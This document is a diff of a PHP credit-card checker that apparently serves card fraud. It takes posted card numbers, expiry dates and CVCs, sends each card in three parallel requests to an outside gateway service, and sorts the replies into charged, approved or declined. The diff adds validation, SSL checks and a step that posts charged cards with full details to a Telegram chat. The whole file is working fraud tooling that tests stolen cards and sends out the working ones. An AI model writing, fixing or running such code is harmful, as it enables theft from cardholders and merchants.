@@ -25,7 +25,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 }
 
 // Validate API key
-$validation = validateApiKey();
+ $validation = validateApiKey();
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
@@ -34,8 +34,8 @@ if (!$validation['valid']) {
     exit;
 }
 
-$expectedApiKey = $validation['response']['apiKey'];
-$providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
+ $expectedApiKey = $validation['response']['apiKey'];
+ $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
@@ -49,7 +49,7 @@ ini_set('display_errors', 0);
 error_reporting(E_ALL);
 
 // Optional file-based logging for debugging
-$log_file = __DIR__ . '/paypal0.1$_debug.log';
+ $log_file = __DIR__ . '/paypal0.1$_debug.log';
 function log_message($message) {
     global $log_file;
     file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
@@ -113,46 +113,62 @@ function sendTelegramNotification($card_details, $status, $response) {
     $payload = [
         'chat_id' => $chat_id,
         'text' => $message,
-        'parse_mode' => 'HTML'
-        'disable_web_page_preview' => true
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true  // Added to prevent link previews
     ];
 
     $ch = curl_init($telegram_url);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Changed to true for security
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Added timeout
     $result = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_error = curl_error($ch);
     curl_close($ch);
 
     if ($http_code !== 200 || !$result) {
-        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Response: " . ($result ?: 'No response'));
+        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
     } else {
         log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
     }
 }
 
+// Check if card details are provided
+if (!isset($_POST['card']) || !is_array($_POST['card'])) {
+    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
+    exit;
+}
 
 // Extract card details
-$card_number = $_POST['card']['number'];
-$exp_month = str_pad($_POST['card']['exp_month'], 2, '0', STR_PAD_LEFT); // Ensure MM format
-$exp_year = $_POST['card']['exp_year'];
-$cvc = $_POST['card']['cvc'];
+ $card_number = $_POST['card']['number'] ?? '';
+ $exp_month = $_POST['card']['exp_month'] ?? '';
+ $exp_year = $_POST['card']['exp_year'] ?? '';
+ $cvc = $_POST['card']['cvc'] ?? '';
+
+// Validate card details
+if (empty($card_number) || empty($exp_month) || empty($exp_year) || empty($cvc)) {
+    echo json_encode(['status' => 'ERROR', 'message' => 'Missing card details']);
+    exit;
+}
+
+// Normalize exp_month to 2 digits
+ $exp_month = str_pad($exp_month, 2, '0', STR_PAD_LEFT);
 
 // Normalize exp_year to 4 digits if it's 2 digits (YY)
 if (strlen($exp_year) === 2) {
     $exp_year = (intval($exp_year) < 50 ? '20' : '19') . $exp_year;
 } elseif (strlen($exp_year) !== 4 || !is_numeric($exp_year)) {
-    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid year format']);
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid year format']);
     exit;
 }
 
 // Format cc string: number|month|year|cvc
-$cc = $card_number . '|' . $exp_month . '|' . $exp_year . '|' . $cvc;
+ $cc = $card_number . '|' . $exp_month . '|' . $exp_year . '|' . $cvc;
 
 // API URL
-$api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';
+ $api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';
 
 // Function to make parallel API request
 function makeRequest($url) {
@@ -160,28 +176,44 @@ function makeRequest($url) {
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Enable SSL verification
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
     $response = curl_exec($ch);
     $error = curl_error($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    return $error ? false : $response;
+    
+    if ($error) {
+        log_message("CURL Error: $error");
+        return false;
+    }
+    
+    if ($http_code != 200) {
+        log_message("HTTP Error: $http_code");
+        return false;
+    }
+    
+    return $response;
 }
 
-// Create 3 parallel requests with slight variations (e.g., adding random delay to simulate different attempts)
-$responses = [];
-$multi_handle = curl_multi_init();
+// Create 3 parallel requests with slight variations
+ $responses = [];
+ $multi_handle = curl_multi_init();
 
-$channels = [];
+ $channels = [];
 for ($i = 0; $i < 3; $i++) {
     $url = $api_url_base . urlencode($cc) . '&attempt=' . $i . '&rand=' . mt_rand();
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Enable SSL verification
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
     curl_multi_add_handle($multi_handle, $ch);
     $channels[$i] = $ch;
 }
 
-$active = null;
+ $active = null;
 do {
     curl_multi_exec($multi_handle, $active);
     usleep(10000); // Small delay to prevent CPU overload
@@ -189,39 +221,61 @@ do {
 
 foreach ($channels as $i => $ch) {
     $response = curl_multi_getcontent($ch);
-    if ($response !== false) {
+    $error = curl_error($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    
+    if ($error) {
+        log_message("CURL Error for request $i: $error");
+    } elseif ($http_code != 200) {
+        log_message("HTTP Error for request $i: $http_code");
+    } elseif ($response !== false) {
         $responses[$i] = $response;
+        log_message("Response $i: $response");
     }
+    
     curl_multi_remove_handle($multi_handle, $ch);
 }
 curl_multi_close($multi_handle);
 
+// Check if we got any valid responses
+if (empty($responses)) {
+    log_message("No valid responses received from API");
+    echo json_encode(['status' => 'ERROR', 'message' => 'API requests failed']);
+    exit;
+}
+
 // Process responses
-$best_response = ['status' => 'DECLINED', 'message' => 'All attempts failed'];
+ $best_response = ['status' => 'DECLINED', 'message' => 'All attempts failed'];
+ $valid_response_found = false;
+
 foreach ($responses as $response) {
     if ($response !== false) {
         $data = json_decode($response, true);
         if (json_last_error() === JSON_ERROR_NONE && isset($data['message'], $data['status'])) {
             $best_response = $data;
+            $valid_response_found = true;
             break; // Take the first valid response
+        } else {
+            log_message("JSON decode error: " . json_last_error_msg());
         }
     }
 }
 
-if (json_last_error() !== JSON_ERROR_NONE) {
-    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid API response']);
+if (!$valid_response_found) {
+    log_message("No valid JSON response found");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid API response format']);
     exit;
 }
 
 // Extract message and status
-$message = $best_response['message'] ?? 'Unknown error';
-$api_status = $best_response['status'] ?? 'UNKNOWN';
+ $message = $best_response['message'] ?? 'Unknown error';
+ $api_status = $best_response['status'] ?? 'UNKNOWN';
 
 // Lowercase for case-insensitive comparison
-$message_lower = strtolower($message);
+ $message_lower = strtolower($message);
 
 // Define phrase arrays
-$charged_phrases = [
+ $charged_phrases = [
     'transaction approved',
     'payment successful',
     'transaction complete',
@@ -231,7 +285,7 @@ $charged_phrases = [
     'thank you for your payment'
 ];
 
-$approved_phrases = [
+ $approved_phrases = [
     'cvv',
     'card code',
     'security code',
@@ -241,7 +295,7 @@ $approved_phrases = [
     'security code'
 ];
 
-$declined_phrases = [
+ $declined_phrases = [
     'failed',
     'declined',
     'transaction declined',
@@ -253,7 +307,7 @@ $declined_phrases = [
 ];
 
 // Determine status
-$our_status = 'DECLINED';
+ $our_status = 'DECLINED';
 
 // Check for CHARGED
 foreach ($charged_phrases as $phrase) {
@@ -288,7 +342,12 @@ if ($our_status === 'DECLINED') {
 }
 
 // Prepare output message
-$our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');
+ $our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');
+
+// Send Telegram notification for CHARGED status
+if ($our_status === 'CHARGED') {
+    sendTelegramNotification($cc, $our_status, $our_message);
+}
 
 // Output JSON response
 echo json_encode(['status' => $our_status, 'message' => $our_message]);
